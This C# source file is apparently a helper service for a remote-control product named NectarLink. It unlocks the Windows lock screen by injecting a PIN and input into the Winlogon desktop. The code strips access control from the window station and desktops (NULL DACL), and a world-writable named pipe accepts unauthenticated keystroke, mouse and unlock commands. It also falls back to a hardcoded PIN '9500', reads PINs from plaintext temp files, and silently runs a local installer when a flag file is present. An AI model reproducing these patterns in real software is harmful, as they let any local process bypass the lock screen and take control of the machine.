using System;
using System.IO;
using System.IO.Pipes;
using System.Threading;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using System.Diagnostics;

namespace NectarLinkUnlockHelper
{
    class Program
    {
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr OpenWindowStationW([MarshalAs(UnmanagedType.LPWStr)] string lpszWinSta, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetProcessWindowStation(IntPtr hWinSta);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool CloseWindowStation(IntPtr hWinSta);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr OpenInputDesktop(uint dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr OpenDesktopW([MarshalAs(UnmanagedType.LPWStr)] string lpszDesktop, uint dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex, [Out] byte[] pvInfo, uint nLength, out uint lpnLengthNeeded);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern uint SetSecurityInfo(IntPtr handle, int ObjectType, uint SecurityInfo, IntPtr psidOwner, IntPtr psidGroup, IntPtr pDacl, IntPtr pSacl);

        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo);

        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        [DllImport("user32.dll")]
        static extern short VkKeyScan(char ch);

        const int SE_WINDOW_OBJECT = 7;
        const uint DACL_SECURITY_INFORMATION = 4;
        const uint WRITE_DAC = 0x00040000;
        const uint DESKTOP_ALL = 0x01FF;

        const uint MOUSEEVENTF_MOVE = 0x0001;
        const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        const uint MOUSEEVENTF_LEFTUP = 0x0004;
        const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
        const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
        const uint MOUSEEVENTF_ABSOLUTE = 0x8000;

        const uint KEYEVENTF_KEYUP = 0x0002;

        static string currentAttachedDesk = null;

        static void Log(string msg)
        {
            try
            {
                File.AppendAllText(@"C:\nectarlink\unlock.log", string.Format("[{0:yyyy-MM-dd HH:mm:ss.fff}] {1}\r\n", DateTime.Now, msg));
            }
            catch { }
        }

        static void GrantDesktopAccess(IntPtr handle)
        {
            if (handle == IntPtr.Zero) return;
            try
            {
                // NULL DACL grants full unrestricted access to all users & processes
                SetSecurityInfo(handle, SE_WINDOW_OBJECT, DACL_SECURITY_INFORMATION, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }
            catch { }
        }

        static void EnsureDesktopsAccessible()
        {
            try
            {
                IntPtr hwinsta = OpenWindowStationW("WinSta0", false, WRITE_DAC | 0x037F);
                if (hwinsta != IntPtr.Zero)
                {
                    SetProcessWindowStation(hwinsta);
                    GrantDesktopAccess(hwinsta);
                    CloseWindowStation(hwinsta);
                }

                IntPtr hDeskLogon = OpenDesktopW("Winlogon", 0, false, WRITE_DAC | DESKTOP_ALL);
                if (hDeskLogon != IntPtr.Zero)
                {
                    GrantDesktopAccess(hDeskLogon);
                    CloseDesktop(hDeskLogon);
                }

                IntPtr hDeskDefault = OpenDesktopW("Default", 0, false, WRITE_DAC | DESKTOP_ALL);
                if (hDeskDefault != IntPtr.Zero)
                {
                    GrantDesktopAccess(hDeskDefault);
                    CloseDesktop(hDeskDefault);
                }

                IntPtr hDeskInput = OpenInputDesktop(0, false, WRITE_DAC | DESKTOP_ALL);
                if (hDeskInput != IntPtr.Zero)
                {
                    GrantDesktopAccess(hDeskInput);
                    CloseDesktop(hDeskInput);
                }
            }
            catch { }
        }

        static string GetActiveDesktopName()
        {
            try
            {
                IntPtr hdesk = OpenInputDesktop(0, false, 0x0001);
                if (hdesk != IntPtr.Zero)
                {
                    byte[] buf = new byte[256];
                    uint needed;
                    if (GetUserObjectInformation(hdesk, 2, buf, (uint)buf.Length, out needed))
                    {
                        string name = System.Text.Encoding.ASCII.GetString(buf, 0, (int)needed).TrimEnd('\0');
                        CloseDesktop(hdesk);
                        return name;
                    }
                    CloseDesktop(hdesk);
                }
            }
            catch { }
            return "unknown";
        }

        static bool IsWorkstationLocked()
        {
            try
            {
                IntPtr hdesk = OpenInputDesktop(0, false, 0x0001);
                if (hdesk == IntPtr.Zero)
                {
                    return true;
                }
                byte[] buf = new byte[256];
                uint needed;
                if (GetUserObjectInformation(hdesk, 2, buf, (uint)buf.Length, out needed))
                {
                    string name = System.Text.Encoding.ASCII.GetString(buf, 0, (int)needed).TrimEnd('\0');
                    CloseDesktop(hdesk);
                    return !name.Equals("Default", StringComparison.OrdinalIgnoreCase);
                }
                CloseDesktop(hdesk);
            }
            catch { }
            return false;
        }

        static void AttachInputDesktop()
        {
            try
            {
                IntPtr hwinsta = OpenWindowStationW("WinSta0", false, 0x037F);
                if (hwinsta != IntPtr.Zero)
                {
                    SetProcessWindowStation(hwinsta);
                }
            }
            catch { }

            IntPtr hdesk = IntPtr.Zero;
            uint[] accessRights = new uint[] { 0x01FF, 0x0081, 0x02000000, 0x0001, 0x0080 };
            foreach (uint access in accessRights)
            {
                hdesk = OpenInputDesktop(0, false, access);
                if (hdesk != IntPtr.Zero)
                {
                    break;
                }
            }

            if (hdesk != IntPtr.Zero)
            {
                GrantDesktopAccess(hdesk);
                byte[] buf = new byte[256];
                uint needed;
                string deskName = "unknown";
                if (GetUserObjectInformation(hdesk, 2, buf, (uint)buf.Length, out needed))
                {
                    deskName = System.Text.Encoding.ASCII.GetString(buf, 0, (int)needed).TrimEnd('\0');
                }

                if (deskName.Equals(currentAttachedDesk, StringComparison.OrdinalIgnoreCase))
                {
                    CloseDesktop(hdesk);
                    return;
                }

                if (SetThreadDesktop(hdesk))
                {
                    currentAttachedDesk = deskName;
                    Log("AttachInputDesktop: attached to desktop: " + deskName);
                    return;
                }
                CloseDesktop(hdesk);
            }
        }

        static void SendKey(ushort vk, ushort scan)
        {
            keybd_event((byte)vk, (byte)scan, 0, UIntPtr.Zero);
            Thread.Sleep(25);
            keybd_event((byte)vk, (byte)scan, KEYEVENTF_KEYUP, UIntPtr.Zero);
            Thread.Sleep(20);
        }

        static void ClickPinBox()
        {
            mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, 32768, 33400, 0, UIntPtr.Zero);
            Thread.Sleep(30);
            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, UIntPtr.Zero);
            Thread.Sleep(40);
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, UIntPtr.Zero);
            Thread.Sleep(60);
        }

        static void TypeChar(char c)
        {
            if (c >= '0' && c <= '9')
            {
                byte vk = (byte)(0x30 + (c - '0'));
                SendKey(vk, 0);
            }
            else if (c >= 'a' && c <= 'z')
            {
                byte vk = (byte)(0x41 + (c - 'a'));
                SendKey(vk, 0);
            }
            else if (c >= 'A' && c <= 'Z')
            {
                byte vk = (byte)(0x41 + (c - 'A'));
                keybd_event(0x10, 0x2A, 0, UIntPtr.Zero); // Shift down
                Thread.Sleep(15);
                SendKey(vk, 0);
                Thread.Sleep(15);
                keybd_event(0x10, 0x2A, KEYEVENTF_KEYUP, UIntPtr.Zero); // Shift up
            }
            else if (c == ' ')
            {
                SendKey(0x20, 0x39);
            }
            else if (c == '\r' || c == '\n')
            {
                SendKey(0x0D, 0x1C);
            }
            else if (c == '\b')
            {
                SendKey(0x08, 0x0E);
            }
            else
            {
                short vkScan = VkKeyScan(c);
                if (vkScan != -1)
                {
                    byte vk = (byte)(vkScan & 0xFF);
                    bool shift = ((vkScan >> 8) & 1) != 0;
                    if (shift)
                    {
                        keybd_event(0x10, 0x2A, 0, UIntPtr.Zero);
                        Thread.Sleep(15);
                    }
                    SendKey(vk, 0);
                    if (shift)
                    {
                        Thread.Sleep(15);
                        keybd_event(0x10, 0x2A, KEYEVENTF_KEYUP, UIntPtr.Zero);
                    }
                }
            }
            Thread.Sleep(15);
        }

        static void TypePin(string pin)
        {
            AttachInputDesktop();
            EnsureDesktopsAccessible();

            // Escape any existing error message or camera/lock prompt
            SendKey(0x1B, 0x01); // VK_ESCAPE
            Thread.Sleep(60);

            ClickPinBox();
            Thread.Sleep(60);

            // Select all (Ctrl+A) and clear with backspaces to guarantee empty field
            keybd_event(0x11, 0x1D, 0, UIntPtr.Zero); // Ctrl down
            Thread.Sleep(20);
            SendKey(0x41, 0x1E); // 'A'
            Thread.Sleep(20);
            keybd_event(0x11, 0x1D, KEYEVENTF_KEYUP, UIntPtr.Zero); // Ctrl up
            Thread.Sleep(30);

            for (int i = 0; i < 4; i++)
            {
                SendKey(0x08, 0x0E); // VK_BACK
                Thread.Sleep(15);
            }
            Thread.Sleep(60);

            foreach (char c in pin)
            {
                TypeChar(c);
                Thread.Sleep(25);
            }
            Thread.Sleep(100);
            SendKey(0x0D, 0x1C); // VK_RETURN
        }

        static void ExecuteUnlock(string pin)
        {
            Log("ExecuteUnlock: starting unlock sequence with PIN len " + pin.Length);
            AttachInputDesktop();
            EnsureDesktopsAccessible();

            string desk = GetActiveDesktopName();
            Log("Active desktop before unlock: " + desk);

            if (!desk.Equals("Winlogon", StringComparison.OrdinalIgnoreCase))
            {
                Log("Stage 1: Waking display and dismissing lock curtain...");
                SendKey(0x20, 0x39); // VK_SPACE
                Thread.Sleep(80);
                SendKey(0x0D, 0x1C); // VK_RETURN
                Thread.Sleep(800);
                AttachInputDesktop();
                EnsureDesktopsAccessible();
            }
            else
            {
                Log("Stage 1: Already on Winlogon login panel, skipping curtain dismissal.");
            }

            Log("Stage 2: Entering PIN...");
            TypePin(pin);

            Thread.Sleep(1000);
            if (IsWorkstationLocked())
            {
                Log("Stage 3: Screen still locked, executing retry PIN entry...");
                AttachInputDesktop();
                EnsureDesktopsAccessible();
                TypePin(pin);
            }
            else
            {
                Log("Workstation unlocked successfully!");
            }
        }

        static void CleanRegistryDuplicates()
        {
            try
            {
                Registry.LocalMachine.DeleteSubKeyTree(@"Software\Microsoft\Windows\CurrentVersion\Uninstall\{2450BA1D-5E26-4907-8488-C9AB2F664DFC}", false);
            }
            catch { }
            try
            {
                Registry.LocalMachine.DeleteSubKeyTree(@"Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{2450BA1D-5E26-4907-8488-C9AB2F664DFC}", false);
            }
            catch { }
        }

        static void PerformCleanInstall()
        {
            Log("=== Performing clean install of latest NectarLink as SYSTEM ===");
            try
            {
                foreach (var p in Process.GetProcesses())
                {
                    try
                    {
                        string name = p.ProcessName.ToLower();
                        if (name.Contains("nectarlink") || name.Contains("smartconnect"))
                        {
                            Log("Killing process: " + p.ProcessName + " (" + p.Id + ")");
                            p.Kill();
                            p.WaitForExit(3000);
                        }
                    }
                    catch { }
                }

                CleanRegistryDuplicates();

                try
                {
                    Registry.LocalMachine.DeleteSubKeyTree(@"Software\Microsoft\Windows\CurrentVersion\Uninstall\Nectarlink", false);
                }
                catch { }

                string setupPath = @"C:\nectarlink\Nectarlink-Custom-Windows-Setup.exe";
                if (File.Exists(setupPath))
                {
                    Log("Launching installer: " + setupPath + " /S");
                    var psi = new ProcessStartInfo(setupPath, "/S")
                    {
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    var proc = Process.Start(psi);
                    if (proc != null)
                    {
                        proc.WaitForExit();
                        Log("Installer exited with code: " + proc.ExitCode);
                    }
                }
            }
            catch (Exception ex)
            {
                Log("PerformCleanInstall error: " + ex.ToString());
            }
            finally
            {
                try { File.Delete(@"C:\nectarlink\do_clean_install.flag"); } catch { }
            }
            Log("=== Clean install finished ===");
        }

        static void HandleCommand(string line)
        {
            if (string.IsNullOrWhiteSpace(line)) return;
            string[] parts = line.Trim().Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length == 0) return;

            string cmd = parts[0].ToUpperInvariant();
            switch (cmd)
            {
                case "PING":
                    break;

                case "PERM":
                    EnsureDesktopsAccessible();
                    break;

                case "UNLOCK":
                    string pin = parts.Length > 1 ? parts[1] : "9500";
                    ExecuteUnlock(pin);
                    break;

                case "TOUCH":
                    // TOUCH down 0.5 0.5
                    if (parts.Length >= 4)
                    {
                        string action = parts[1].ToLowerInvariant();
                        float fx = 0f, fy = 0f;
                        float.TryParse(parts[2], System.Globalization.NumberStyles.Float, System.Globalization.CultureInfo.InvariantCulture, out fx);
                        float.TryParse(parts[3], System.Globalization.NumberStyles.Float, System.Globalization.CultureInfo.InvariantCulture, out fy);
                        uint ax = (uint)Math.Round(Math.Max(0f, Math.Min(1f, fx)) * 65535f);
                        uint ay = (uint)Math.Round(Math.Max(0f, Math.Min(1f, fy)) * 65535f);

                        AttachInputDesktop();
                        mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, ax, ay, 0, UIntPtr.Zero);
                        if (action == "down")
                        {
                            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, UIntPtr.Zero);
                        }
                        else if (action == "up")
                        {
                            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, UIntPtr.Zero);
                        }
                    }
                    break;

                case "CLICK":
                    // CLICK 0.5 0.5
                    if (parts.Length >= 3)
                    {
                        float fx = 0f, fy = 0f;
                        float.TryParse(parts[1], System.Globalization.NumberStyles.Float, System.Globalization.CultureInfo.InvariantCulture, out fx);
                        float.TryParse(parts[2], System.Globalization.NumberStyles.Float, System.Globalization.CultureInfo.InvariantCulture, out fy);
                        uint ax = (uint)Math.Round(Math.Max(0f, Math.Min(1f, fx)) * 65535f);
                        uint ay = (uint)Math.Round(Math.Max(0f, Math.Min(1f, fy)) * 65535f);

                        AttachInputDesktop();
                        mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, ax, ay, 0, UIntPtr.Zero);
                        Thread.Sleep(20);
                        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, UIntPtr.Zero);
                        Thread.Sleep(30);
                        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, UIntPtr.Zero);
                    }
                    break;

                case "MOUSE":
                    // MOUSE <flags> <dx> <dy> <data>
                    if (parts.Length >= 5)
                    {
                        uint flags = 0, dx = 0, dy = 0, data = 0;
                        uint.TryParse(parts[1], out flags);
                        uint.TryParse(parts[2], out dx);
                        uint.TryParse(parts[3], out dy);
                        uint.TryParse(parts[4], out data);

                        AttachInputDesktop();
                        mouse_event(flags, dx, dy, data, UIntPtr.Zero);
                    }
                    break;

                case "KEY":
                    // KEY <vk> <scan> <flags>
                    if (parts.Length >= 4)
                    {
                        byte vk = 0, scan = 0;
                        uint flags = 0;
                        byte.TryParse(parts[1], out vk);
                        byte.TryParse(parts[2], out scan);
                        uint.TryParse(parts[3], out flags);

                        AttachInputDesktop();
                        keybd_event(vk, scan, flags, UIntPtr.Zero);
                    }
                    break;

                case "ENTER":
                    AttachInputDesktop();
                    SendKey(0x0D, 0x1C);
                    break;

                case "BACKSPACE":
                    int count = 1;
                    if (parts.Length > 1) int.TryParse(parts[1], out count);
                    AttachInputDesktop();
                    for (int i = 0; i < Math.Max(1, count); i++)
                    {
                        SendKey(0x08, 0x0E);
                        Thread.Sleep(15);
                    }
                    break;

                case "TYPE":
                    if (parts.Length > 1)
                    {
                        string text = line.Substring(line.IndexOf(' ') + 1);
                        AttachInputDesktop();
                        foreach (char c in text)
                        {
                            TypeChar(c);
                            Thread.Sleep(20);
                        }
                    }
                    break;
            }
        }

        static void RunServer()
        {
            Log("=== NectarLink Input Service Pipe Server started ===");
            CleanRegistryDuplicates();

            // Background thread ensuring all desktops remain accessible to user capture
            var secThread = new Thread(() =>
            {
                while (true)
                {
                    EnsureDesktopsAccessible();
                    Thread.Sleep(300);
                }
            }) { IsBackground = true };
            secThread.Start();

            PipeSecurity ps = new PipeSecurity();
            ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.ReadWrite, AccessControlType.Allow));
            ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null), PipeAccessRights.ReadWrite, AccessControlType.Allow));

            while (true)
            {
                try
                {
                    using (var pipe = new NamedPipeServerStream(
                        "nectarlink_lock_input",
                        PipeDirection.InOut,
                        NamedPipeServerStream.MaxAllowedServerInstances,
                        PipeTransmissionMode.Byte,
                        PipeOptions.Asynchronous,
                        4096,
                        4096,
                        ps))
                    {
                        pipe.WaitForConnection();
                        try
                        {
                            using (var reader = new StreamReader(pipe, System.Text.Encoding.UTF8))
                            using (var writer = new StreamWriter(pipe, System.Text.Encoding.UTF8) { AutoFlush = true })
                            {
                                string line;
                                while ((line = reader.ReadLine()) != null)
                                {
                                    string trimmed = line.Trim();
                                    if (string.IsNullOrEmpty(trimmed)) continue;

                                    if (trimmed.Equals("PING", StringComparison.OrdinalIgnoreCase))
                                    {
                                        writer.WriteLine("PONG");
                                    }
                                    else
                                    {
                                        HandleCommand(trimmed);
                                        writer.WriteLine("OK");
                                    }
                                }
                            }
                        }
                        catch (IOException)
                        {
                            // Client disconnected cleanly. Normal pipe lifecycle.
                        }
                    }
                }
                catch (Exception ex)
                {
                    Log("Pipe Server exception: " + ex.Message);
                    Thread.Sleep(50);
                }
            }
        }

        static void Main(string[] args)
        {
            CleanRegistryDuplicates();

            if (File.Exists(@"C:\nectarlink\do_clean_install.flag"))
            {
                PerformCleanInstall();
                return;
            }

            bool isService = false;
            string pin = null;

            foreach (var arg in args)
            {
                if (arg.Equals("--service", StringComparison.OrdinalIgnoreCase) ||
                    arg.Equals("-s", StringComparison.OrdinalIgnoreCase))
                {
                    isService = true;
                }
                else if (arg.Equals("--clean-install", StringComparison.OrdinalIgnoreCase))
                {
                    PerformCleanInstall();
                    return;
                }
                else if (!arg.StartsWith("-"))
                {
                    pin = arg.Trim();
                }
            }

            // If args contain --service or no args provided while running non-interactively, run the pipe server!
            if (isService || args.Length == 0)
            {
                RunServer();
                return;
            }

            // Otherwise, one-shot PIN unlock mode
            Log("=== NectarLink one-shot unlock started ===");
            if (!IsWorkstationLocked())
            {
                Log("Workstation is already unlocked; skipping.");
                return;
            }

            if (string.IsNullOrEmpty(pin))
            {
                string[] candidates = new string[] {
                    @"C:\nectarlink\saved_pin.txt",
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"nectarlink\saved_pin.txt"),
                    Path.Combine(Path.GetTempPath(), "nectarlink_saved_pin.txt")
                };
                foreach (var path in candidates)
                {
                    if (File.Exists(path))
                    {
                        try {
                            string content = File.ReadAllText(path).Trim();
                            if (!string.IsNullOrEmpty(content)) { pin = content; break; }
                        } catch { }
                    }
                }
            }
            if (string.IsNullOrEmpty(pin))
            {
                pin = "9500";
            }

            ExecuteUnlock(pin);
        }
    }
}
